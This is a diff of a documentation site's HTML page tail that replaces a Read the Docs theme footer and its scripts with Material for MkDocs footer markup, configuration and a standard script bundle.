+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
             </div>
-          </div><footer>
-    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
-        <a href="../shadowIT/" class="btn btn-neutral float-left" title="Shadow IT"><span class="icon icon-circle-arrow-left"></span> Previous</a>
-    </div>
-
-  <hr/>
-
-  <div role="contentinfo">
-    <!-- Copyright etc -->
-  </div>
-
-  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
-</footer>
           
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
         </div>
-      </div>
-
-    </section>
-
-  </div>
-
-  <div class="rst-versions" role="note" aria-label="Versions">
-  <span class="rst-current-version" data-toggle="rst-current-version">
-    
-    
-      <span><a href="../shadowIT/" style="color: #fcfcfc">&laquo; Previous</a></span>
-    
-    
-  </span>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
 </div>
-    <script src="../js/jquery-3.6.0.min.js"></script>
-    <script>var base_url = "..";</script>
-    <script src="../js/theme_extra.js"></script>
-    <script src="../js/theme.js"></script>
-      <script src="../search/main.js"></script>
-    <script>
-        jQuery(function () {
-            SphinxRtdTheme.Navigation.enable(true);
-        });
-    </script>
-
-</body>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.tabs", "navigation.instant", "navigation.tracking", "content.code.copy", "content.code.annotate", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
 </html>
